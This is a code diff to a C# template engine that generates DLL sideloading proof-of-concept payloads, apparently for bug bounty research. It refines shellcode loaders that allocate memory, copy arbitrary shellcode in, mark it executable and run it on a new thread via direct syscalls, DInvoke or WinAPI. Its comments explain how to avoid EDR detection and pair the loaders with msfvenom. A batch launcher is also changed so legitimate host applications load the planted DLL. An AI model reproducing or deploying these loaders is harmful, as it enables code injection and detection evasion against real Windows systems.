@@ -574,6 +574,17 @@ public static class TemplateEngine
                  + "    }\n"
                  + "}\n";
 
+        // MessageBox payload — body and title come from TemplateConfig so the
+        // researcher can stamp the popup with case identifiers without hand-
+        // editing generated C. {Researcher} placeholder substituted, then the
+        // result is C-string-escaped (\\, \", \n) before embedding.
+        var msgBody = CEscapeForLiteral(
+            (config.MessageBoxBody ?? "").Replace("{Researcher}", r));
+        var msgTitle = CEscapeForLiteral(
+            (config.MessageBoxTitle ?? "").Replace("{Researcher}", r));
+        if (string.IsNullOrEmpty(msgBody)) msgBody = "DLL Sideloading PoC";
+        if (string.IsNullOrEmpty(msgTitle)) msgTitle = "DllSidecar PoC";
+
         if (config.Payload == PayloadType.MessageBox && config.DInvoke)
             return "static void do_payload(void) {\n"
                  + proof
@@ -583,17 +594,29 @@ public static class TemplateEngine
                  + "    if (!hUser32) return;\n"
                  + "    fn_MessageBoxA pMB = (fn_MessageBoxA)dinvoke_get_proc(hUser32, H_MESSAGEBOXA);\n"
                  + "    if (!pMB) return;\n"
-                 + $"    pMB(NULL, \"DLL Sideloading PoC\\nResearcher: {r}\\nDllSidecar — BugAInters 2026\",\n"
-                 + $"        \"DllSidecar PoC {r}\", MB_ICONWARNING | MB_OK);\n"
+                 + $"    pMB(NULL, \"{msgBody}\",\n"
+                 + $"        \"{msgTitle}\", MB_ICONWARNING | MB_OK);\n"
                  + "}\n";
 
         // MessageBox without DInvoke
         return "static void do_payload(void) {\n"
              + proof
-             + $"    MessageBoxA(NULL, \"DLL Sideloading PoC\\nResearcher: {r}\\nDllSidecar — BugAInters 2026\",\n"
-             + $"        \"DllSidecar PoC {r}\", MB_ICONWARNING | MB_OK);\n"
+             + $"    MessageBoxA(NULL, \"{msgBody}\",\n"
+             + $"        \"{msgTitle}\", MB_ICONWARNING | MB_OK);\n"
              + "}\n";
     }
+
+    /// <summary>
+    /// Escape a runtime string for embedding inside a C double-quoted literal:
+    /// backslash → \\, double-quote → \", any newline (CR/LF/CRLF) → \n. Order
+    /// matters — backslash first so we don't double-escape later sequences.
+    /// </summary>
+    private static string CEscapeForLiteral(string s) => s
+        .Replace("\\", "\\\\")
+        .Replace("\"", "\\\"")
+        .Replace("\r\n", "\\n")
+        .Replace("\n", "\\n")
+        .Replace("\r", "\\n");
 
     /// <summary>
     /// C snippet that writes a proof-of-execution file to %TEMP%\dllsidecar_proof_&lt;pid&gt;.txt.
@@ -629,13 +652,23 @@ public static class TemplateEngine
             Enumerable.Range(0, scHex.Length / 2).Select(i => $"0x{scHex.Substring(i * 2, 2)}"));
         int scLen = scHex.Length / 2;
 
+        // Pattern across all three paths:
+        //   1. Allocate RW (NOT RWX — RWX in heap is one of the first things any
+        //      EDR flags). Lifetime: process; we don't free.
+        //   2. Copy shellcode in. RtlCopyMemory is a memcpy alias from winnt.h.
+        //   3. Flip to RX. PAGE_EXECUTE_READ, not RWX.
+        //   4. Run on a fresh thread (CreateThread / NtCreateThreadEx) so the
+        //      shellcode gets its own stack and doesn't blend with the loader's.
+        //      Fire-and-forget — no WaitForSingleObject because we may be inside
+        //      DllMain holding the loader lock; pair with msfvenom EXITFUNC=thread
+        //      so the shellcode terminates its own thread cleanly when done.
         if (config.DirectSyscalls)
             return "static void do_payload(void) {\n"
                  + $"    unsigned char sc[] = {{{scBytes}}};\n"
                  + $"    PVOID mem = NULL; SIZE_T sz = {scLen}; ULONG old;\n"
                  + "    sc_NtAllocateVirtualMemory((HANDLE)-1, &mem, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n"
                  + "    if (!mem) return;\n"
-                 + $"    for (SIZE_T i = 0; i < {scLen}; i++) ((BYTE*)mem)[i] = sc[i];\n"
+                 + $"    RtlCopyMemory(mem, sc, {scLen});\n"
                  + "    sc_NtProtectVirtualMemory((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);\n"
                  + "    HANDLE hThread = NULL;\n"
                  + "    sc_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, mem, NULL, 0, 0, 0, 0, NULL);\n"
@@ -646,21 +679,24 @@ public static class TemplateEngine
                  + $"    unsigned char sc[] = {{{scBytes}}};\n"
                  + "    fn_VirtualAlloc pVA = DINVOKE(H_KERNEL32_DLL, H_VIRTUALALLOC, fn_VirtualAlloc);\n"
                  + "    fn_VirtualProtect pVP = DINVOKE(H_KERNEL32_DLL, H_VIRTUALPROTECT, fn_VirtualProtect);\n"
-                 + "    if (!pVA || !pVP) return;\n"
+                 + "    fn_CreateThread pCT = DINVOKE(H_KERNEL32_DLL, H_CREATETHREAD, fn_CreateThread);\n"
+                 + "    if (!pVA || !pVP || !pCT) return;\n"
                  + $"    LPVOID mem = pVA(NULL, {scLen}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n"
                  + "    if (!mem) return;\n"
-                 + $"    for (int i = 0; i < {scLen}; i++) ((BYTE*)mem)[i] = sc[i];\n"
+                 + $"    RtlCopyMemory(mem, sc, {scLen});\n"
                  + $"    DWORD old; pVP(mem, {scLen}, PAGE_EXECUTE_READ, &old);\n"
-                 + "    ((void(*)())mem)();\n"
+                 + "    HANDLE hThread = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n"
+                 + "    if (hThread) CloseHandle(hThread);\n"
                  + "}\n";
 
         return "static void do_payload(void) {\n"
              + $"    unsigned char sc[] = {{{scBytes}}};\n"
              + $"    LPVOID mem = VirtualAlloc(NULL, {scLen}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n"
              + "    if (!mem) return;\n"
-             + $"    for (int i = 0; i < {scLen}; i++) ((BYTE*)mem)[i] = sc[i];\n"
+             + $"    RtlCopyMemory(mem, sc, {scLen});\n"
              + $"    DWORD old; VirtualProtect(mem, {scLen}, PAGE_EXECUTE_READ, &old);\n"
-             + "    ((void(*)())mem)();\n"
+             + "    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n"
+             + "    if (hThread) CloseHandle(hThread);\n"
              + "}\n";
     }
 
@@ -934,7 +970,13 @@ public static class TemplateEngine
             sb.Append("    echo [!] Host EXE not found: \"%HOST_EXE%\"\r\n");
             sb.Append("    del \"%DEPLOY_PATH%\" >nul 2>&1\r\n");
             sb.Append("    exit /b 3\r\n");
-            sb.Append(")\r\n\r\n");
+            sb.Append(")\r\n");
+            // Derive host's own directory so we can launch with CWD = install dir.
+            // Many hosts (OBS, Discord, VSCode, Jetbrains tools) resolve assets
+            // (locale .ini, themes, plugins) relative to CWD before falling back
+            // to GetModuleFileName. Inheriting the .bat's CWD (output\<poc>\) makes
+            // those lookups fail and the host aborts before our DLL is ever touched.
+            sb.Append("for %%I in (\"%HOST_EXE%\") do set \"HOST_DIR=%%~dpI\"\r\n\r\n");
 
             sb.Append("echo === RUN ===\r\n");
             if (config.PreLaunchDelaySec > 0)
@@ -946,7 +988,7 @@ public static class TemplateEngine
             if (config.WaitForHostExit)
             {
                 sb.Append("echo [i] Close the host window when done -- script will then restore.\r\n");
-                sb.Append("start /WAIT \"\" \"%HOST_EXE%\"\r\n\r\n");
+                sb.Append("start \"\" /D \"%HOST_DIR%\" /WAIT \"%HOST_EXE%\"\r\n\r\n");
                 // Trampoline launchers (Battle.net, Teams, many updaters) spawn a child and
                 // exit instantly, which makes start /WAIT return before the child actually
                 // loads our DLL. Pause here so the user controls when RESTORE fires.
@@ -961,7 +1003,7 @@ public static class TemplateEngine
                 // Fire-and-forget: start the host non-blocking, wait N seconds,
                 // then dump proof file (if written by payload) and proceed to cleanup.
                 sb.Append($"echo [i] Fire-and-forget mode -- will wait {config.NonBlockingTimeoutSec}s then inspect proof file.\r\n");
-                sb.Append("start \"\" \"%HOST_EXE%\"\r\n");
+                sb.Append("start \"\" /D \"%HOST_DIR%\" \"%HOST_EXE%\"\r\n");
                 sb.Append($"timeout /t {config.NonBlockingTimeoutSec} /nobreak >nul\r\n");
                 sb.Append("echo.\r\n");
                 sb.Append("echo === PROOF ===\r\n");
